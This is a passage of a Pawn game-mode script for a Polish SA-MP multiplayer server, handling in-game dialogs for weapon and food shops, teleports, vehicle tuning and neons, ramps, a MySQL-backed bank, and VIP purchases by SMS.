						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					SetPlayerHealth(playerid, 100.0);
					GivePlayerMoney(playerid, -1000);
				}
			}
			SCM(playerid, -1, ""C_B"Kupi³eœ/aœ posi³ek");
			return 1;
		}
		case 20:
		{
			SetPVarInt(playerid, "pEnterPick", 0);
			if(!response) return 1;

			switch(listitem)
			{
				case 0:
				{
					if(GetPlayerMoney(playerid) < 2000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					cmd_pancerz(playerid, " ");
				}case 1:
				{
					if(GetPlayerMoney(playerid) < 500)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -500);
					GivePlayerWeapon(playerid, 22, 2000);
				}case 2:
				{
					if(GetPlayerMoney(playerid) < 1000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -1000);
					GivePlayerWeapon(playerid, 24, 2000);
				}case 3:
				{
					if(GetPlayerMoney(playerid) < 500)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -500);
					GivePlayerWeapon(playerid, 4, 1);
				}case 4:
				{
					if(GetPlayerMoney(playerid) < 1000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -1000);
					GivePlayerWeapon(playerid, 17, 5);
				}case 5:
				{
					if(GetPlayerMoney(playerid) < 4000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -4000);
					GivePlayerWeapon(playerid, 26, 2000);
				}case 6:
				{
					if(GetPlayerMoney(playerid) < 2000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -2000);
					GivePlayerWeapon(playerid, 25, 2000);
				}case 7:
				{
					if(GetPlayerMoney(playerid) < 6000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -6000);
					GivePlayerWeapon(playerid, 27, 2000);

				}case 8:
				{
					if(GetPlayerMoney(playerid) < 4000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -4000);
					GivePlayerWeapon(playerid, 31, 2000);
				}case 9:
				{
					if(GetPlayerMoney(playerid) < 3000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -3000);
					GivePlayerWeapon(playerid, 30, 2000);

				}case 10:
				{
					if(GetPlayerMoney(playerid) < 6000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ {00AAFF}pieni¹dze!!!");

					GivePlayerMoney(playerid, -6000);
					GivePlayerWeapon(playerid, 28, 2000);

				}case 11:
				{
					if(GetPlayerMoney(playerid) < 6000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -6000);
					GivePlayerWeapon(playerid, 32, 2000);
				}case 12:
				{
					if(GetPlayerMoney(playerid) < 3000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -3000);
					GivePlayerWeapon(playerid, 29, 2000);
				}case 13:
				{
					if(GetPlayerMoney(playerid) < 6000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -6000);
					GivePlayerWeapon(playerid, 34, 2000);
				}case 14:
				{
					if(GetPlayerMoney(playerid) < 1000)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					GivePlayerMoney(playerid, -1000);
					GivePlayerWeapon(playerid, 46, 1);
				}
			}
			if(listitem != 0)
			{
				format(strx, sizeof strx, "* Kupi³eœ/aœ: "C_B"%s", inputtext);
				SCM(playerid, 0xFFFFFFFF, strx);
			}
		}
		case 1212:
		{
			if(!response) return 1;

			switch(listitem)
			{
				case 0: SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
				case 1: SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
				case 2: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
				case 3: SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
				case 4: SetPlayerFightingStyle(playerid, FIGHT_STYLE_GRABKICK);
				case 5: SetPlayerFightingStyle(playerid, FIGHT_STYLE_ELBOW);
			}
		}
		case 101:
		{
			if(response)
			{
				CallRemoteFunction("OnPlayerCommandText", "ds", playerid, inputtext);
			}
			return 1;
		}
		case 1655:
		{
			if(!response) return 1;
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			if(listitem == 1) return Dialog(playerid, 1653, DIALOG_LIST, "Slot 1\nSlot 2\nSlot 3", "Zapisz", "Anuluj");
			else if(listitem == 0) return Dialog(playerid, 1654, DIALOG_LIST, "Slot 1\nSlot 2\nSlot 3", "Wczytaj", "Anuluj");
		}
		case 1653:
		{
			if(!response) return 1;

			if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != 0)
				return InfoBox(playerid, ""C_O"Nie mo¿esz tutaj zapisaæ teleportu!");

			GetPlayerPos(playerid,pPrivTele[playerid][listitem][0],pPrivTele[playerid][listitem][1],pPrivTele[playerid][listitem][2]);
			if(!IsPlayerInAnyVehicle(playerid))
			{
				GetPlayerFacingAngle(playerid, pPrivTele[playerid][listitem][3]);
			}else GetVehicleZAngle(GetPlayerVehicleID(playerid), pPrivTele[playerid][listitem][3]);
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			InfoBox(playerid, "Zapisano lokalizacje.");
		}
		case 1654:
		{
			if(!response) return 1;

			if(pPrivTele[playerid][listitem][0] == 0.0 && pPrivTele[playerid][listitem][1] == 0.0)
				return InfoBox(playerid, ""C_O"Ten Slot nie zosta³ jeszcze zapisany!");

			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
			{
				SetPlayerPos(playerid, pPrivTele[playerid][listitem][0],pPrivTele[playerid][listitem][1],pPrivTele[playerid][listitem][2]);
				SetPlayerFacingAngle(playerid,  pPrivTele[playerid][listitem][3]);
				}else{
				SetVehiclePos(GetPlayerVehicleID(playerid), pPrivTele[playerid][listitem][0], pPrivTele[playerid][listitem][1],pPrivTele[playerid][listitem][2] + 0.5);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),  pPrivTele[playerid][listitem][3]);
			}
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			InfoBox(playerid, ""C_O"Zosta³eœ teleportowany do "C_B"Zapisanej lokalizacji");
			return 1;
		}
		case 3309:
		{
			if(!response)
				return DeletePVar(playerid, "vTune");

			switch(GetPVarInt(playerid, "vTune"))
			{
				case 11:
				{
					if(GetPlayerMoney(playerid) < 800)
					{
						SCM(playerid, -1,  "* {00AAFF}Potrzebujesz "C_B"600$"C_O", ¿eby to kupiæ!");
						DeletePVar(playerid, "vTune");
						return 1;

					}else GivePlayerMoney(playerid, -800);


					ChangeVehiclePaintjob(GetPlayerVehicleID(playerid), listitem);
					format(strx, sizeof strx, "* "C_O"Kupi³eœ PaintJob o ID: "C_B"%d", ++listitem);
					SCM(playerid, -1, strx);
					return DeletePVar(playerid, "vTune");
				}
				case 12:
				{
					new color;
					if(sscanf(inputtext, "i", color))
						return Dialog(playerid, 3309, DIALOG_INPUT, "Podaj numer koloru (0 - 126), -1 da ci losowy kolor pojazdu.\nWpisa³eœ nieprawid³owe ID koloru!", "Wybierz", "Anuluj");

					switch(color)
					{
						case -1:
							ChangeVehicleColor(GetPlayerVehicleID(playerid), random(cellmax), random(cellmax));

						case 0 .. 126:
							ChangeVehicleColor(GetPlayerVehicleID(playerid), color, color);

						default:
							return Dialog(playerid, 3309, DIALOG_INPUT, "Podaj numer koloru (0 - 126), -1 da ci losowy kolor pojazdu.\nWpisa³eœ nieprawid³owe ID koloru!", "Wybierz", "Anuluj");
					}

					format(strx, sizeof strx, ""C_O"Zmieni³eœ kolor pojazdu na nr. "C_B"%d", color);
					SCM(playerid, -1, strx);
					return DeletePVar(playerid, "vTune");
				}
				case 13:
				{
					AddVehicleComponent(GetPlayerVehicleID(playerid), wheels_info[listitem][wID]);
					format(strx, sizeof strx, ""C_O"Zmieni³eœ felgi w pojedŸie na "C_B"%s", wheels_info[listitem][wName]);
					SCM(playerid, -1, strx);
					return DeletePVar(playerid, "vTune");
				}
				case 14:
				{
					if(response)
					{
						AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);
						}else{
						RemoveVehicleComponent(GetPlayerVehicleID(playerid), 1087);
					}
					return DeletePVar(playerid, "vTune");
				}
			}

			switch(listitem)
			{
				case 0:
				{
					if(GetPlayerMoney(playerid) < 5000)
						return SCM(playerid, -1, "* "C_O"Potrzebujesz "C_B"5000$"C_O", ¿eby to kupiæ!"), DeletePVar(playerid, "vTune");

					//

					new vid = GetPlayerVehicleID(playerid);
					ChangeVehiclePaintjob(vid, random(3));
					AddVehicleComponent(vid, 1087);
					AddVehicleComponent(vid, wheels_info[random(sizeof wheels_info)][wID]);
					TuneVehicle(vid);
					TuneObjectVehicle(vid);
					DestroyNeon(vid);
					switch(random(11))
					{
						case 0:
						{
							vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = -1;
						}
						case 1:
						{
							vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = -1;
						}
						case 2:
						{
							vNeon[vid][0] = CreateObject(18649,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = -1;
						}
						case 3:
						{
							vNeon[vid][0] = CreateObject(18652,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = -1;
						}
						case 4:
						{
							vNeon[vid][0] = CreateObject(18651,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = -1;
						}
						case 5:
						{
							vNeon[vid][0] = CreateObject(18650,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = -1;
						}
						case 6:
						{
							vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = CreateObject(18649,0,0,0,0,0,0, 100.0);
						}
						case 7:
						{
							vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);
						}
						case 8:
						{
							vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);
						}
						case 9:
						{
							vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = CreateObject(18650,0,0,0,0,0,0, 100.0);

						}
						case 10:
						{
							vNeon[vid][0] = CreateObject(18649,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);

						}
						case 11:
						{
							vNeon[vid][0] = CreateObject(18652,0,0,0,0,0,0, 100.0);
							vNeon[vid][1] = CreateObject(18650,0,0,0,0,0,0, 100.0);
						}
					}
					if(vNeon[vid][1] != -1)
						AttachObjectToVehicle(vNeon[vid][1], vid, 0.0, 0.0, -0.70, 0.0, 0.0, 0.0);

					AttachObjectToVehicle(vNeon[vid][0], vid, 0.0, 0.0, -0.70, 0.0, 0.0, 0.0);

					//
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					InfoBox(playerid, ""C_O"Pe³ny tuning zosta³ zainstalowany!");
				}
				case 1:
				{
					if(GetPlayerMoney(playerid) < 5000)
						return SCM(playerid, -1, ""C_O"Potrzebujesz "C_B"5000$"C_O", ¿eby to kupiæ!"), DeletePVar(playerid, "vTune");


					new vid = GetPlayerVehicleID(playerid);

					if(random(2) == 1)
					{
						ChangeVehiclePaintjob(vid, random(3));
					}
					if(random(2) == 1)
					{
						AddVehicleComponent(vid, 1087);
					}
					if(random(2) == 1)
					{
						AddVehicleComponent(vid, wheels_info[random(sizeof wheels_info)][wID]);
					}
					if(random(2) == 1)
					{
						TuneVehicle(vid);
					}
					if(random(2) == 1)
					{
						TuneObjectVehicle(vid);
					}
					if(random(2) == 1)
					{
						DestroyNeon(vid);
						switch(random(11))
						{
							case 0:
							{
								vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = -1;
							}
							case 1:
							{
								vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = -1;
							}
							case 2:
							{
								vNeon[vid][0] = CreateObject(18649,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = -1;
							}
							case 3:
							{
								vNeon[vid][0] = CreateObject(18652,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = -1;
							}
							case 4:
							{
								vNeon[vid][0] = CreateObject(18651,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = -1;
							}
							case 5:
							{
								vNeon[vid][0] = CreateObject(18650,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = -1;
							}
							case 6:
							{
								vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = CreateObject(18649,0,0,0,0,0,0, 100.0);
							}
							case 7:
							{
								vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);
							}
							case 8:
							{
								vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);
							}
							case 9:
							{
								vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = CreateObject(18650,0,0,0,0,0,0, 100.0);

							}
							case 10:
							{
								vNeon[vid][0] = CreateObject(18649,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);

							}
							case 11:
							{
								vNeon[vid][0] = CreateObject(18652,0,0,0,0,0,0, 100.0);
								vNeon[vid][1] = CreateObject(18650,0,0,0,0,0,0, 100.0);
							}
						}
						if(vNeon[vid][1] != -1)
							AttachObjectToVehicle(vNeon[vid][1], vid, 0.0, 0.0, -0.70, 0.0, 0.0, 0.0);

						AttachObjectToVehicle(vNeon[vid][0], vid, 0.0, 0.0, -0.70, 0.0, 0.0, 0.0);
					}

					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					InfoBox(playerid, ""C_O"Losowy tuning zosta³ zainstalowany!");
				}
				case 2:
				{
					if(GetPlayerMoney(playerid) < 5000)
						return SCM(playerid, -1, "Potrzebujesz "C_B"5000$"C_O", ¿eby to kupiæ!"), DeletePVar(playerid, "vTune");

					if(TuneVehicle(GetPlayerVehicleID(playerid)) == 0)
					{
						PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
						InfoBox(playerid, ""C_O"Nie jesteœ w odpowiednim pojeŸdzie!\n\nDla tego pojazdu nie jest dostêpny podstawowy tuning!");
						return 0;
					}
					PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
					SCM(playerid, -1, ""C_O"Kupi³eœ tuning za "C_B"$5000");
					GivePlayerMoney(playerid, -5000);
					RepairVehicle(GetPlayerVehicleID(playerid));
					return 0;
				}
				case 3:
				{
					switch(GetVehicleModel(GetPlayerVehicleID(playerid)))
					{
						case 534, 535, 536, 558, 559, 560, 561, 562, 565, 567, 575, 576:
						{
							SetPVarInt(playerid, "vTune", 11); // PaintJob
							return Dialog(playerid, 3309, DIALOG_LIST, "PaintJob ID: 1\nPaintJob ID: 2\nPaintJob ID: 3", "Wybierz", "Anuluj");
						}
						default: return InfoBox(playerid, ""C_O"Nie jesteœ w odpowiednim pojeŸdzie!\n\nDla tego pojazdu nie jest dostêpny PaintJob");
					}
				}

				case 4:
				{
					SetPVarInt(playerid, "vTune", 12);
					return Dialog(playerid, 3309, DIALOG_INPUT, "Podaj numer koloru (0 - 126), -1 da ci losowy kolor pojazdu.", "Wybierz", "Anuluj");
				}
				case 5:
				{
					switch(GetVehicleModel(GetPlayerVehicleID(playerid)))
					{
						case 523, 537, 538, 539, 548, 553, 563, 564, 569, 570, 577, 578, 581, 584, 586, 590, 591, 592,
						593, 594, 595, 606, 607, 608, 610, 611, 417, 426, 430, 435, 446, 447, 448, 449, 450, 452,
						453, 454, 460, 461, 462, 463, 464, 465, 468, 469, 472, 473, 476, 481, 487, 488, 493, 497,
						501, 509, 510, 511, 512, 513, 519, 520, 521, 522:
						return InfoBox(playerid, ""C_O"Nie jesteœ w odpowiednim pojeŸdzie!\n\nDla tego pojazdu nie s¹ dostêpne felgi");

						default:
						{
							bstrx = "";
							PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
							for(new w; w != sizeof wheels_info; w++)
								format(bstrx, sizeof bstrx, "%s* %s\n", bstrx, wheels_info[w][wName]);
							PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
							SetPVarInt(playerid, "vTune", 13);
							return Dialog(playerid, 3309, DIALOG_LIST, bstrx, "Wybierz", "Anuluj");

						}
					}
				}
				case 6:
				{
					if(HydraulicVehicle(GetPlayerVehicleID(playerid)))
					{
						PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
						SetPVarInt(playerid, "vTune", 14);
						return Dialog(playerid, 3309, DIALOG_BOX, "Zamontuj Hydraulikê!", "Zamontuj", "Wymontuj");
					}else return  InfoBox(playerid, ""C_O"Nie jesteœ w odpowiednim pojeŸdzie!\n\nDla tego pojazdu nie jest dostêpna Hydraulika");
				}
				case 7:
				{
					cmd_neon(playerid, " ");
				}
				case 8:
				{
					cmd_pobject(playerid, " ");
				}
			}
			return 1;
		}
		case 50:
		{
			if(!response) return 1;

			cmd_v(playerid, inputtext);
		}
		case 2565:
		{
			if(!response) return 1;
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			switch(listitem)
			{
				case 0: Dialog(playerid, 2566, DIALOG_LIST, "Metalowa blacha\nBetonowy wyskok\nParê desek\nParê desek na ska³ach\nMa³a rampa kaskaderska\nDu¿a rampa kaskaderska\nPodwójna rampa kaskaderska\nOgromna rampa kaskaderska\nSkateboard ramp\nWielka, stara rampa", "Ustaw", "Anuluj");
				case 1: Dialog(playerid, 2567, DIALOG_BOX, "Wybierz czy chcesz aby rampy pod klawiszem CTRL by³y w³¹czone czy wy³¹czone.", "W³¹cz", "Wy³¹cz");
			}
		}
		case 2566:
		{
			if(!response) return 1;
			pRamp[playerid][1] = listitem;
			SCM(playerid, -1,""C_O"Zmieni³eœ typ rampy");
			format(strx, sizeof strx, "UPDATE `players` SET `ramp` = '%d' WHERE `nick` = '%s'", listitem, pName[playerid]);
			mysql_query(strx);

		}case 2567:
		{
			if(!response) SCM(playerid, -1, "{FF0000}Wy³¹czy³eœ rampy.");
			else SCM(playerid, -1, ""C_O"W³¹czy³eœ rampy.");

			pRamp[playerid][0] = response;

		}
		case 8131:
		{
			if(!response || !IsPlayerInAnyVehicle(playerid)) return 1;

			new vid = GetPlayerVehicleID(playerid);
			DestroyNeon(vid);
			if(listitem == 12) return 1;

			switch(listitem)
			{
				case 0:
				{
					vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = -1;
				}
				case 1:
				{
					vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = -1;
				}
				case 2:
				{
					vNeon[vid][0] = CreateObject(18649,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = -1;
				}
				case 3:
				{
					vNeon[vid][0] = CreateObject(18652,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = -1;
				}
				case 4:
				{
					vNeon[vid][0] = CreateObject(18651,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = -1;
				}
				case 5:
				{
					vNeon[vid][0] = CreateObject(18650,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = -1;
				}
				case 6:
				{
					vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = CreateObject(18649,0,0,0,0,0,0, 100.0);
				}
				case 7:
				{
					vNeon[vid][0] = CreateObject(18648,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);
				}
				case 8:
				{
					vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);
				}
				case 9:
				{
					vNeon[vid][0] = CreateObject(18647,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = CreateObject(18650,0,0,0,0,0,0, 100.0);

				}
				case 10:
				{
					vNeon[vid][0] = CreateObject(18649,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = CreateObject(18652,0,0,0,0,0,0, 100.0);

				}
				case 11:
				{
					vNeon[vid][0] = CreateObject(18652,0,0,0,0,0,0, 100.0);
					vNeon[vid][1] = CreateObject(18650,0,0,0,0,0,0, 100.0);
				}
			}

			if(vNeon[vid][1] != -1)
				AttachObjectToVehicle(vNeon[vid][1], vid, 0.0, 0.0, -0.70, 0.0, 0.0, 0.0);

			AttachObjectToVehicle(vNeon[vid][0], vid, 0.0, 0.0, -0.70, 0.0, 0.0, 0.0);
			SCM(playerid, -1, ""C_O"Neon zosta³ zainstalowany.");

		}
		case 232:
		{
			if(!response) return TogglePlayerControllable(playerid, 1);

			switch(listitem)
			{
				case 0:
				{
					new bank[11], ip[20];
					format(strx, sizeof strx, "SELECT `bank`, `ip` FROM `players` WHERE `nick`='%s'", pName[playerid]);
					mysql_query(strx);
					mysql_store_result();

					mysql_fetch_field("bank", bank);
					mysql_fetch_field("ip", ip);

					mysql_free_result();
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					format(strx, sizeof strx, ""C_O"Stan konta:"C_B" %s$\n"C_O"Ostatnia zmiana zrobiona z IP:"C_B" %s", bank, ip);
					Dialog(playerid, 233, DIALOG_BOX, strx, "Powrót", "Zamknij");
					return 1;
				}
				case 1:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					Dialog(playerid, 234, DIALOG_INPUT, ""C_O"Wpisz kwotê, któr¹ chcesz wp³aciæ:","Wp³aæ","Anuluj");
				}
				case 2:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					Dialog(playerid, 235, DIALOG_INPUT, ""C_O"Wpisz kwotê, któr¹ chcesz wyp³aciæ:","Wyp³aæ","Anuluj");
				}
				case 3:
				{
					format(strx, sizeof strx, "UPDATE `players` SET `bank` = `bank` + '%d' WHERE `nick` = '%s'", GetPlayerMoney(playerid), pName[playerid]);
					mysql_query(strx);
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					SetPlayerMoney(playerid, 0);
					Dialog(playerid, 232, DIALOG_LIST, "Stan konta\nWp³aæ\nWyp³aæ\nWp³aæ wszystko\nWyp³aæ wszystko", "Wybierz", "Zamknij");
				}
				case 4:
				{
					new bank[11];
					format(strx, sizeof strx, "SELECT `bank` FROM `players` WHERE `nick` = '%s'", pName[playerid]);
					mysql_query(strx);
					mysql_store_result();
					mysql_fetch_field("bank", bank);
					mysql_free_result();

					if(strval(bank) > 0)
					{
						GivePlayerMoney(playerid, strval(bank));
						format(strx, sizeof strx, "UPDATE `players` SET `bank` = '0' WHERE `nick` = '%s'", pName[playerid]);
						mysql_query(strx);
					}
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					Dialog(playerid, 232, DIALOG_LIST, "Stan konta\nWp³aæ\nWyp³aæ\nWp³aæ wszystko\nWyp³aæ wszystko", "Wybierz", "Zamknij");
				}
			}
			return 1;
		}
		case 233:
		{
			if(!response) return TogglePlayerControllable(playerid, 1);
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			Dialog(playerid, 232, DIALOG_LIST, "Stan konta\nWp³aæ\nWyp³aæ\nWp³aæ wszystko\nWyp³aæ wszystko", "Wybierz", "Zamknij");
			return 1;
		}
		case 234:
		{
			if(!response)
				return Dialog(playerid, 232, DIALOG_LIST, "Stan konta\nWp³aæ\nWyp³aæ\nWp³aæ wszystko\nWyp³aæ wszystko", "Wybierz", "Zamknij");

			if(GetPlayerMoney(playerid) < strval(inputtext) || strval(inputtext) <= 0)
				return Dialog(playerid, 234, DIALOG_INPUT, "Nie masz tyle gotowki lub wpisana kwota jest nieprawid³owa!\n\n"C_O"Wpisz kwotê, któr¹ chcesz wp³aciæ:","Wp³aæ","Anuluj");

			GivePlayerMoney(playerid, strval(inputtext) * -1);
			format(strx, sizeof strx, "UPDATE `players` SET `bank` = `bank` + '%d' WHERE `nick` = '%s'", strval(inputtext), pName[playerid]);
			mysql_query(strx);
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			Dialog(playerid, 232, DIALOG_LIST, "Stan konta\nWp³aæ\nWyp³aæ\nWp³aæ wszystko\nWyp³aæ wszystko\n", "Wybierz", "Zamknij");
			return 1;
		}
		case 235:
		{
			if(!response)
				return Dialog(playerid, 232, DIALOG_LIST, "Stan konta\nWp³aæ\nWyp³aæ\nWp³aæ wszystko\nWyp³aæ wszystko\n", "Wybierz", "Zamknij");

			new bank[11];
			format(strx, sizeof strx, "SELECT `bank` FROM `players` WHERE `nick` = '%s'", pName[playerid]);
			mysql_query(strx);
			mysql_store_result();
			mysql_fetch_field("bank", bank);
			mysql_free_result();

			if(strval(bank) < strval(inputtext) || strval(inputtext) <= 0)
				return Dialog(playerid, 234, DIALOG_INPUT, "Nie ma tyle pieniêdzy w banku lub wpisana kwota jest nieprawid³owa!\n\n"C_O"Wpisz kwotê, któr¹ chcesz wyp³aciæ:","Wp³aæ","Anuluj");

			GivePlayerMoney(playerid, strval(inputtext));
			format(strx, sizeof strx, "UPDATE `players` SET `bank` = `bank` - '%d' WHERE `nick` = '%s'", strval(inputtext), pName[playerid]);
			mysql_query(strx);
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			Dialog(playerid, 232, DIALOG_LIST, "Stan konta\nWp³aæ\nWyp³aæ\nWp³aæ wszystko\nWyp³aæ wszystko\n", "Wybierz", "Zamknij");
			return 1;
		}
		case 753:
		{
			if(response) return 1;
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			format(bstrx, sizeof bstrx, ""C_O"Kupujesz, b¹dŸ przed³u¿asz konto VIP na/o "C_B"31"C_O" dni\n\n");
			format(bstrx, sizeof bstrx, "%sWyœlij SMS o treœci "C_B"AA.SP"C_O" na numer "C_B"7455"C_O"(koszt: "C_B"4,92 "C_O"z³ brutto)\n\n", bstrx);
			strcat(bstrx, "W razie pytañ zapraszamy na forum "C_B"www.TOP.xaa.pl\n");
			Dialog(playerid, 756, DIALOG_INPUT, bstrx, "Kup", "Zamknij");
		}
		case 754:
		{
			if(!response) return 1;

			SetPVarInt(playerid, "vipSMS", listitem);
			new vip[30];
			format(strx, sizeof strx, "SELECT `vip` FROM `players` WHERE `nick`='%s'", pName[playerid]);
			mysql_query(strx);
			mysql_store_result();
			mysql_fetch_field("vip", vip);
			mysql_free_result();

			switch(listitem)
			{
				case 1..8:
				{
					if(vip[0] != '@')
					{

						new number[] = {-1,7136,7255,7355,7455,7555,7636,7936};
						new amount[] = {0,4,8,20,30,50,65,80};
						PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
						format(bstrx, sizeof bstrx, ""C_O"Kupujesz, b¹dŸ przed³u¿asz konto VIP na/o "C_B"31"C_O" dni\n\n", amount[listitem]);
						format(bstrx, sizeof bstrx, "%sWyœlij SMS o treœci "C_B"AA.SP"C_O" na numer "C_B"7636"C_O"\n\n", bstrx, number[listitem]);
						strcat(bstrx, "W razie pytañ zapraszamy na forum "C_B"www.TOP.xaa.pl\n");
						Dialog(playerid, 755, DIALOG_INPUT, bstrx, "KUP", "Anuluj");

					}
					else
					{
						PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
						InfoBox(playerid, ""C_O"Ten rodzaj konta VIP mo¿esz kupiæ dopiero po wykorzystaniu aktualnego.");
						return 1;
					}
				}
				case 9:
				{
					if(Vip[playerid])
					{
						PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
						InfoBox(playerid, ""C_O"Ten rodzaj konta VIP mo¿esz kupiæ dopiero po wykorzystaniu aktualnego.");
						return 1;
					}
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					format(bstrx, sizeof bstrx, ""C_O"Kupujesz, b¹dŸ przed³u¿asz konto VIP na/o "C_B"dwa miesi¹ce"C_O", czyli "C_B"61 "C_O"dni\nPamiêtaj, ¿e w tym rodzaju konta nie jest brana pod uwagê przegrana iloœæ czasu.\n\n");
					strcat(bstrx, "Wyœlij SMS o treœci "C_B"AA.SP"C_O" na numer "C_B"7455"C_O"\n\n");
					strcat(bstrx, "W razie pytañ zapraszamy na forum "C_B"www.TOP.xaa.pl\n");
					Dialog(playerid, 755, DIALOG_INPUT, bstrx, "KUP", "Anuluj");
				}
				case 10:
				{
					if(Vip[playerid])
					{
						PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
